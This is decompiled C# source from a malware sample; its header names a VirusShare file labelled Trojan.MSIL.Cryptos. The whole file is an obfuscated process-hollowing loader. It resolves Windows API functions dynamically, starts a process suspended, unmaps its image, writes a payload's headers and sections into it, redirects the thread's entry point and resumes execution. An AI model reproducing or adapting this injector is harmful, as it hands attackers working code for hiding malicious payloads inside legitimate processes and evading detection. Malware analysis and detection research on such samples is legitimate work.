// Decompiled with JetBrains decompiler
// Type: .
// Assembly: file, Version=0.0.0.0, Culture=neutral, PublicKeyToken=72ec7481cfa903fe
// MVID: 17BB4BA8-04F1-4383-A3D1-FFAF516C79D3
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Cryptos.cvxf-4765b693a5f0024c84d332e633fb35b8d37891fb93e6a2bf615652c82aa7fdde.exe

using \u0001;
using Microsoft.VisualBasic;
using System;
using System.Runtime.InteropServices;

namespace \u0005
{
  internal sealed class \u0001
  {
    [NonSerialized]
    internal static \u0002 \u0001;

    static \u0001() => \u0003.\u0002(typeof (\u0005.\u0001));

    public static void \u0002([In] byte[] obj0, [In] string obj1)
    {
      \u0005.\u0001.\u0001 context = new \u0005.\u0001.\u0001();
      \u0005.\u0001.\u0005 info = new \u0005.\u0001.\u0005();
      \u0005.\u0001.\u0006 startup = new \u0005.\u0001.\u0006();
      \u0005.\u0001.\u0007 process1 = new \u0005.\u0001.\u0007();
      \u0005.\u0001.\u0007 thread;
      IntPtr ptr;
      \u0005.\u0001.\u0008 obj2;
      string str1;
      int num1;
      if (true)
      {
        thread = new \u0005.\u0001.\u0007();
        GCHandle gcHandle = GCHandle.Alloc((object) obj0, GCHandleType.Pinned);
        ptr = gcHandle.AddrOfPinnedObject();
        if (true)
        {
          int int32 = ptr.ToInt32();
          if (true)
            goto label_29;
label_3:
          \u0005.\u0001.\u0008 obj3 = new \u0005.\u0001.\u0008();
          object structure = Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), obj3.GetType());
          \u0005.\u0001.\u0008 obj4;
          obj2 = structure != null ? (\u0005.\u0001.\u0008) structure : obj4;
          gcHandle.Free();
          str1 = \u0005.\u0001.\u0001(297);
          goto label_5;
label_29:
          num1 = int32;
          goto label_3;
        }
        else
          goto label_8;
      }
      else
        goto label_8;
label_5:
      string str2 = \u0005.\u0001.\u0001(318);
      string str3 = \u0005.\u0001.\u0001(343);
      string str4 = \u0005.\u0001.\u0001(368);
      string str5 = \u0005.\u0001.\u0001(393);
      string str6 = \u0005.\u0001.\u0001(422);
      string str7 = \u0005.\u0001.\u0001(443);
      string str8 = \u0005.\u0001.\u0001(468) + \u0005.\u0001.\u0001(481);
      \u0005.\u0001.\u0012 obj5 = \u0005.\u0001.\u0002<\u0005.\u0001.\u0012>(\u0005.\u0001.\u0001(490), str1);
      \u0005.\u0001.\u0018 obj6 = \u0005.\u0001.\u0002<\u0005.\u0001.\u0018>(\u0005.\u0001.\u0001(490), str2);
      \u0005.\u0001.\u0014 obj7 = \u0005.\u0001.\u0002<\u0005.\u0001.\u0014>(\u0005.\u0001.\u0001(490), str3);
      \u0005.\u0001.\u0013 obj8 = \u0005.\u0001.\u0002<\u0005.\u0001.\u0013>(\u0005.\u0001.\u0001(490), str4);
      \u0005.\u0001.\u0016 obj9 = \u0005.\u0001.\u0002<\u0005.\u0001.\u0016>(\u0005.\u0001.\u0001(503), str5);
      \u0005.\u0001.\u0015 obj10 = \u0005.\u0001.\u0002<\u0005.\u0001.\u0015>(\u0005.\u0001.\u0001(490), str6);
      \u0005.\u0001.\u0019 obj11 = \u0005.\u0001.\u0002<\u0005.\u0001.\u0019>(\u0005.\u0001.\u0001(490), str7);
      \u0005.\u0001.\u0017 obj12 = \u0005.\u0001.\u0002<\u0005.\u0001.\u0017>(\u0005.\u0001.\u0001(490), str8);
      IntPtr system;
      if (-(obj5((string) null, obj1, ref process1, ref thread, false, 4U, system, (string) null, ref startup, out info) ? 1 : 0) == 0)
        return;
      \u0005.\u0001.\u000E obj13 = new \u0005.\u0001.\u000E();
      ptr = new IntPtr(checked (num1 + obj2.\u0001));
      object structure1 = Marshal.PtrToStructure(ptr, obj13.GetType());
      \u0005.\u0001.\u000E obj14;
      \u0005.\u0001.\u000E obj15 = structure1 != null ? (\u0005.\u0001.\u000E) structure1 : obj14;
      startup.\u0001 = Strings.Len((object) startup);
label_8:
      context.\u0001 = 65539U;
      int num2 = obj6(info.\u0002, ref context) ? 1 : 0;
      int num3;
      uint num4;
      uint num5;
      long num6;
      int num7;
      int num8;
      while (true)
      {
        \u0005.\u0001.\u0014 obj16 = obj7;
        IntPtr process2 = info.\u0001;
        int address1 = checked ((int) ((long) context.\u0013 + 8L));
        long address2;
        int num9 = checked ((int) address2);
        ref int local1 = ref num9;
        num3 = 0;
        ref int local2 = ref num3;
        int num10 = obj16(process2, address1, ref local1, 4, ref local2);
        address2 = (long) num9;
        long num11 = obj9(info.\u0001, checked ((int) address2));
        int num12 = (int) obj10(info.\u0001, checked ((int) obj15.\u0001.\u0007), obj15.\u0001.\u0010, 12288U, 4U);
        if (false)
        {
          num2 = num12;
        }
        else
        {
          num4 = checked ((uint) num12);
          if (num4 == 0U)
            return;
          \u0005.\u0001.\u0013 obj17 = obj8;
          IntPtr process3 = info.\u0001;
          int address3 = checked ((int) num4);
          byte[] buffer = obj0;
          int size = checked ((int) obj15.\u0001.\u0011);
          num3 = checked ((int) num5);
          ref int local3 = ref num3;
          int num13 = obj17(process3, address3, buffer, size, out local3) ? 1 : 0;
          num5 = checked ((uint) num3);
          num6 = (long) checked (obj2.\u0001 + 248);
          num7 = checked ((int) obj15.\u0001.\u0002 - 1);
          num8 = 0;
          goto label_13;
        }
      }
      goto label_15;
label_13:
      int num14 = num8;
      goto label_27;
label_15:
      \u0005.\u0001.\u0004 obj18;
      \u0005.\u0001.\u0004 obj19 = obj18;
label_17:
      \u0005.\u0001.\u0004 obj20 = obj19;
      int num15 = checked ((int) obj20.\u0002);
      int num16 = 7;
      while (num16 != 0)
      {
        byte[] numArray = new byte[checked (num15 + 1)];
        int num17 = checked ((int) ((long) obj20.\u0002 - 1L));
        int index = 0;
        int num18;
        while (true)
        {
          num8 = index;
          num18 = 4;
          if (num18 != 0)
          {
            if (num18 != 0)
            {
              int num19 = num17;
              if (num8 <= num19)
              {
                numArray[index] = obj0[checked ((int) ((long) obj20.\u0003 + (long) index))];
                checked { ++index; }
              }
              else
                goto label_24;
            }
            else
              goto label_13;
          }
          else
            break;
        }
        num16 = num18;
        num15 = num8;
        continue;
label_24:
        \u0005.\u0001.\u0013 obj21 = obj8;
        IntPtr process4 = info.\u0001;
        int address = checked ((int) (num4 + obj20.\u0001));
        byte[] buffer = numArray;
        int size = checked ((int) obj20.\u0002);
        num3 = checked ((int) num5);
        ref int local = ref num3;
        int num20 = obj21(process4, address, buffer, size, out local) ? 1 : 0;
        if (true)
        {
          num5 = checked ((uint) num3);
          num15 = num14;
          break;
        }
        goto label_5;
      }
      num14 = checked (num15 + 1);
label_27:
      if (num14 <= num7)
      {
        ptr = new IntPtr(checked ((long) num1 + num6 + (long) (num14 * 40)));
        object structure2 = Marshal.PtrToStructure(ptr, obj20.GetType());
        if (structure2 != null)
        {
          obj19 = (\u0005.\u0001.\u0004) structure2;
          goto label_17;
        }
        else
          goto label_15;
      }
      else
      {
        byte[] bytes = BitConverter.GetBytes(num4);
        \u0005.\u0001.\u0013 obj22 = obj8;
        IntPtr process5 = info.\u0001;
        int address = checked ((int) ((long) context.\u0013 + 8L));
        byte[] buffer = bytes;
        num3 = checked ((int) num5);
        ref int local = ref num3;
        int num21 = obj22(process5, address, buffer, 4, out local) ? 1 : 0;
        context.\u0016 = checked (num4 + obj15.\u0001.\u0004);
        int num22 = obj11(info.\u0002, ref context) ? 1 : 0;
        int num23 = (int) obj12(info.\u0002);
      }
    }

    [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0002([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0002(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    private static \u0001 \u0002<\u0001>([In] string obj0, [In] string obj1) => (\u0001) Marshal.GetDelegateForFunctionPointer(\u0005.\u0001.\u0002(\u0005.\u0001.\u0002(ref obj0), ref obj1), typeof (\u0001));

    internal struct \u0001
    {
      public uint \u0001;
      public uint \u0002;
      public uint \u0003;
      public uint \u0004;
      public uint \u0005;
      public uint \u0006;
      public uint \u0007;
      public \u0005.\u0001.\u0002 \u0001;
      public uint \u0008;
      public uint \u000E;
      public uint \u000F;
      public uint \u0010;
      public uint \u0011;
      public uint \u0012;
      public uint \u0013;
      public uint \u0014;
      public uint \u0015;
      public uint \u0016;
      public uint \u0017;
      public uint \u0018;
      public uint \u0019;
      public uint \u001A;
      public uint \u001B;
      public uint \u001C;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
      public byte[] \u0001;
    }

    internal struct \u0002
    {
      public uint \u0001;
      public uint \u0002;
      public uint \u0003;
      public uint \u0004;
      public uint \u0005;
      public uint \u0006;
      public uint \u0007;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] \u0001;
      public uint \u0008;
    }

    internal struct \u0003
    {
      public uint \u0001;
      public uint \u0002;
    }

    internal struct \u0004
    {
      public byte \u0001;
      public \u0005.\u0001.\u0003 \u0001;
      public uint \u0001;
      public uint \u0002;
      public uint \u0003;
      public uint \u0004;
      public uint \u0005;
      public uint \u0006;
      public uint \u0007;
      public uint \u0008;
    }

    internal struct \u0005
    {
      public IntPtr \u0001;
      public IntPtr \u0002;
      public int \u0001;
      public int \u0002;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal struct \u0006
    {
      public int \u0001;
      public string \u0001;
      public string \u0002;
      public string \u0003;
      public int \u0002;
      public int \u0003;
      public int \u0004;
      public int \u0005;
      public int \u0006;
      public int \u0007;
      public int \u0008;
      public int \u000E;
      public short \u0001;
      public short \u0002;
      public int \u000F;
      public int \u0010;
      public int \u0011;
      public int \u0012;
    }

    internal struct \u0007
    {
      public int \u0001;
      public IntPtr \u0001;
      public int \u0002;
    }

    internal struct \u0008
    {
      public ushort \u0001;
      public ushort \u0002;
      public ushort \u0003;
      public ushort \u0004;
      public ushort \u0005;
      public ushort \u0006;
      public ushort \u0007;
      public ushort \u0008;
      public ushort \u000E;
      public ushort \u000F;
      public ushort \u0010;
      public ushort \u0011;
      public ushort \u0012;
      public ushort \u0013;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
      public ushort[] \u0001;
      public ushort \u0014;
      public ushort \u0015;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
      public ushort[] \u0002;
      public int \u0001;
    }

    internal struct \u000E
    {
      public uint \u0001;
      public \u0005.\u0001.\u000F \u0001;
      public \u0005.\u0001.\u0010 \u0001;
    }

    internal struct \u000F
    {
      public ushort \u0001;
      public ushort \u0002;
      public uint \u0001;
      public uint \u0002;
      public uint \u0003;
      public ushort \u0003;
      public ushort \u0004;
    }

    internal struct \u0010
    {
      public ushort \u0001;
      public byte \u0001;
      public byte \u0002;
      public uint \u0001;
      public uint \u0002;
      public uint \u0003;
      public uint \u0004;
      public uint \u0005;
      public uint \u0006;
      public uint \u0007;
      public uint \u0008;
      public uint \u000E;
      public ushort \u0002;
      public ushort \u0003;
      public ushort \u0004;
      public ushort \u0005;
      public ushort \u0006;
      public ushort \u0007;
      public uint \u000F;
      public uint \u0010;
      public uint \u0011;
      public uint \u0012;
      public ushort \u0008;
      public ushort \u000E;
      public uint \u0013;
      public uint \u0014;
      public uint \u0015;
      public uint \u0016;
      public uint \u0017;
      public uint \u0018;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public \u0005.\u0001.\u0011[] \u0001;
    }

    internal struct \u0011
    {
      public uint \u0001;
      public uint \u0002;
    }

    internal delegate bool \u0012(
      string name,
      string command,
      ref \u0005.\u0001.\u0007 process,
      ref \u0005.\u0001.\u0007 thread,
      bool inherit,
      uint flags,
      IntPtr system,
      string current,
      [In] ref \u0005.\u0001.\u0006 startup,
      out \u0005.\u0001.\u0005 info);

    internal delegate bool \u0013(
      IntPtr process,
      int address,
      byte[] buffer,
      int size,
      out int written);

    internal delegate int \u0014(
      IntPtr process,
      int address,
      ref int buffer,
      int size,
      ref int read);

    internal delegate IntPtr \u0015(
      IntPtr process,
      int address,
      uint size,
      uint type,
      uint protect);

    internal delegate long \u0016(IntPtr process, int address);

    internal delegate uint \u0017(IntPtr thread);

    internal delegate bool \u0018(IntPtr thread, ref \u0005.\u0001.\u0001 context);

    internal delegate bool \u0019(IntPtr thread, ref \u0005.\u0001.\u0001 context);
  }
}
